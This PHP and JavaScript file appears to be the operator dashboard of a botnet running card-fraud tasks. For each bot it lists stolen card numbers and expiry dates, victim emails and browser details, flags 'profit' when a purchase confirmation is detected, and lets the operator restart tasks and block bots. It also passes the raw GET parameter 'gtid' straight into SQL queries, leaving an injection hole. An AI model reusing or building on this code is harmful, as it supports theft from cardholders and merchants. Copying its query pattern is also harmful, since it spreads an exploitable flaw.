<script type="text/javascript" src="js/scroll.js"></script>

<script type="text/javascript">
function ajaxScrollToRep(fromel) {
	scrollIt(fromel, 'trep');
}
</script>

<script type="text/javascript">
    var GB_ROOT_DIR = "js/greybox/";
</script>

<script type="text/javascript" src="js/greybox/AJS.js"></script>
<script type="text/javascript" src="js/greybox/AJS_fx.js"></script>
<script type="text/javascript" src="js/greybox/gb_scripts.js"></script>
<link href="js/greybox/gb_styles.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="js/scroll.js"></script>

<script type="text/javascript">
function ajaxScrollToGT(toel) {
	scrollIt('gtlink', toel);
}
function ajaxRefreshRestTime(res) {
	if (res.length) {
		var p1 = 'id_dtr=';
		var pos = res.indexOf(p1);
		if (pos != -1) {
			var str = res.substr(pos + p1.length);
			pos = str.indexOf("'");
			if (pos != -1) {
				iddtr = str.substr(0, pos);
				var el = document.getElementById('td' + iddtr);
				if (el) {
					el.innerHTML = res;
					return true;
				}
			}
		}
	}
	
	alert('Cannot restart task!');
}
function ajaxTaskSetOk(res) {
	if (res.length && res != 'err') {
		var el = document.getElementById('td' + 1 * res + 'd');
		if (el) {
			el.innerHTML = "<center>dont't</center>";
			return true;
		}
	}
	
	alert('Cannot set task to OK!');
}
function ajaxActBot(res) {
	if (res.indexOf('Error') == -1 && res.length != 0) {
		var el = document.getElementById('blkbt' + res);
		if (el) {
			if (el.innerHTML.indexOf('add') == -1)
				el.innerHTML = "<img border='0' src='img/icos/addd.png'>";
			else
				el.innerHTML = "<img border='0' src='img/icos/remove.png'>";
			return true;
		}
	}
	alert('Cannot do smth with bot\n\n' + res);
}
function actBot(id) {
	ajax_load('mod_bot_block.php?id=' + id, ':restofunc:', ajaxActBot);
}
</script>

<?php

$gtid = $_GET['gtid'];
if (!@$gtid) exit;

?>

<h3>Bots with cards for <a href="#null" id='gtlink' onclick="ajaxScrollToGT('t' + '<?php echo $gtid; ?>'); return false;"><b>Global task # <?php echo $gtid; ?> </b></a></h3>

<table align='center' width='740px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>
	<th style="background-color: #9C9">[Restart]</th>
	<th style="background-color: #9C9">[New time]</th>
	<th>ID Task</th>
	<th>Planned Time</th>
	<th>Begin Time</th>
	<th>End Time</th>
	<th>E-Mail</th>
	<th>Message Log</th>
	<!--<th>Version OS</th>
	<th>Version IE</th>
	<th>User Type</th>-->
	<th>Client's info</th>
	<th>Id Bot</th>

<?php

require_once 'mod_dbase.php';
require_once 'mod_time.php';

$dbase = db_open();
if (!$dbase) exit;

$sql = 'SELECT id_task, fk_url, cards.num, cards.exp_date, value_email, begin_time_task, end_time_task, message_log, comment_log, fk_bot_task, text_url_urls, status_task, id_global_task, id_dtime_run, os_version_bot, ie_version_bot, user_type_bot, dtime_run'
	 . ' FROM tasks_t '
	 . ' LEFT JOIN bots_t ON ( bots_t.id_bot = tasks_t.fk_bot_task ) ' 
	 . ' LEFT JOIN logs_t ON ( logs_t.fk_task_log = tasks_t.id_task ) '
	 . ' LEFT JOIN email_t ON ( tasks_t.fk_email_task = email_t.id_email ) '
	 . ' LEFT JOIN cards ON ( cards.id_card = tasks_t.fk_card_task ) '
	 . ' RIGHT JOIN dtimes_run_t ON (tasks_t.id_task = dtimes_run_t.fk_task_dtimes_run), '
	 . ' global_tasks_t '
	 . ' LEFT JOIN urls_t ON ( global_tasks_t.fk_url = urls_t.id_url ) '
	 . ' WHERE global_tasks_t.id_global_task = dtimes_run_t.fk_global_task_dtimes_run '
	 . "   AND id_global_task = $gtid"; 
		
$res = mysqli_query($dbase, $sql);
 	  
if (@($res)) {
	while ($mres = mysqli_fetch_array($res)) {
		echo "<tr align='center'>\n";
		$iddtr = $mres['id_dtime_run'];
		echo "<td id='td" . $iddtr . "d' style=\"background-color: #9C9\">\n";
		if ($mres['status_task'] != 1) {
			echo "<center><a href=\"#null\" onclick=\"ajax_load('mod_task_restart.php?id_dtr=$iddtr&id_gt=" . $mres['id_global_task'] . "&print=1', ':restofunc:', ajaxRefreshRestTime); return false;\"><img border='0' src='img/icos/restart.png' title='Restart this task'></a></center>\n";
			if ($mres['id_task'])
				echo "<center><a href=\"#null\" onclick=\"if (!confirm('Do you really want to set this task to OK?')) return false; ajax_load('mod_task_setok.php?iddtr=$iddtr&idt=" . $mres['id_task'] . "&print=1', ':restofunc:', ajaxTaskSetOk); return false;\"><img border='0' src='img/icos/checkmark.png' title='Set this task as OK'></a></center>\n";
		}
		else
			echo "<center>don't</center>\n";
		echo "</td>";
		echo "<td id='td$iddtr' style=\"background-color: #9C9\">";
		
		$sql = "SELECT new_dtime_manual"
			 . "  FROM dtimes_run_manual"
			 . " WHERE fk_dtimes = $iddtr"
			 . " LIMIT 1";
		$res2 = mysqli_query($dbase, $sql);
		if (@($res2)) {
			$mres2 = mysqli_fetch_array($res2);
			if (@($mres2['new_dtime_manual'])) {
				echo "<center>" . "<a href=\"#null\" onclick=\"GB_show('Edit restart time for task', '../../frm_task_restart_time.php?id_dtr=$iddtr', 200, 500);\"><img border='0' src='img/icos/clock.png' title='Edit time for this task'></a> " . $mres2['new_dtime_manual'] . "</center>";
			}
		}
		
		echo "</td>";
		echo "<td>"; echo $mres['id_task']; echo "</td>";
		echo "<td>"; echo $mres['dtime_run']; echo "</td>";
		echo "<td>"; echo $mres['begin_time_task']; echo "</td>";
		echo "<td>"; echo $mres['end_time_task']; echo "</td>";
		
		$email = $mres['value_email'];
		$pos = strpos($email, '@');
		if ($pos) {
			$email = substr($email, 0, $pos) . '<br>' . substr($email, $pos);
		}
		
		echo "<td>"; echo $email; echo "</td>";
		echo "<td>";

  		$sql = "SELECT id_rep, data_rep"
			 . " FROM bots_rep_t"
			 . " WHERE fk_bot_rep = " . $mres['fk_bot_task']
			 . " AND fk_global_task = $gtid"
			 . " AND ("
			 . "       (data_rep like '%completed.%')"
			 . "    OR (data_rep like '%submitted%')"
			 . "    OR (data_rep like '%INVOICE%Thank You%')"
			 . "    OR (data_rep like '%Thank You%Order%')"
			 . "    OR (data_rep like '%Thank You%Payment%')"
			 . "    OR (data_rep like '%We are sending%')"
			 . "    OR (data_rep like '%Successful%')"
			 . "    ) "
			 . " LIMIT 1";
		$res_ = mysqli_query($dbase, $sql);
		if ((@$res_) && mysqli_num_rows($res_)) {
			$mres_ = mysqli_fetch_array($res_);
			echo "<img src=\"img/icos/profit.png\" title=\"" . $mres_["data_rep"] . "\" border=0 alt=\"$\" >";
		}
		else 
			echo $mres['message_log'];		 
		
		echo "</td>";		   
		//echo "<td>"; echo $mres['os_version_bot']; echo "</td>";
		//echo "<td>"; echo $mres['ie_version_bot']; echo "</td>";
		//echo "<td>"; echo $mres['user_type_bot']; echo "</td>";
		$os = $mres['os_version_bot'];
		$ie = $mres['ie_version_bot'];
		$ua = $mres['user_type_bot'];
		echo "<td><small>$os<br>$ie<br>$ua</td>";
		echo "<td>";
		
		$sql = "SELECT count(*)"
			 . " FROM bots_rep_t"
			 . " WHERE fk_bot_rep = " . $mres['fk_bot_task']
			 . "   AND fk_global_task = $gtid";
		$res_ = mysqli_query ($dbase, $sql);
		if (@$res_) {
			list($cnt) = mysqli_fetch_row($res_);
			if ($cnt > 0)
				echo " <a href='#null' onclick='ajax_load(\"frm_stat_b_sub_sub.php?id_bot_task=" . $mres['fk_bot_task'] . "&gtid=$gtid&tid=" . $mres['id_task'] . "\", \"ajax_stat_b_sub_sub\", ajaxScrollToRep, \"stat_sub_link$i\"); return false;'>";
			echo "<img border='0' src='img/icos/info.png' title=\"Get detail info about bot's (" . $mres['fk_bot_task'] . ") action\"></a>";
			
			if ($cnt > 0)
				echo "</a>";
			  
			$sql = "SELECT blocked"
				 . "  FROM bots_t"
				 . " WHERE id_bot = " . $mres['fk_bot_task']
				 . " LIMIT 1";
			$res_ = mysqli_query ($dbase, $sql);
			if (@$res_ && mysqli_num_rows($res_)) {
				list($blocked) = mysqli_fetch_row($res_);
			
				$idbot = $mres['fk_bot_task'];
				echo " <a id='blkbt$idbot' href=\"#null\" onclick=\"actBot($idbot); return false;\"><img border='0' src='img/icos/" . ($blocked ? "addd.png" : "remove.png") . "' title='". ($blocked ? "Enable bot" : "Disable bot") . "'></a>";
			}
			else {
				//echo "Error: \"" . $sql . "\"<br>";
			}
		  
		}
		echo "</td>";
		echo "</tr>";
		  
	}
	echo "</table>";
}
else {
	echo "<font class='error'>SQL-Error</font> : <small>$sql</small>";
}

db_close($dbase);

?>
 
<hr size='1' color='#CCC'>

<div id='ajax_stat_b_sub_sub'>
</div>
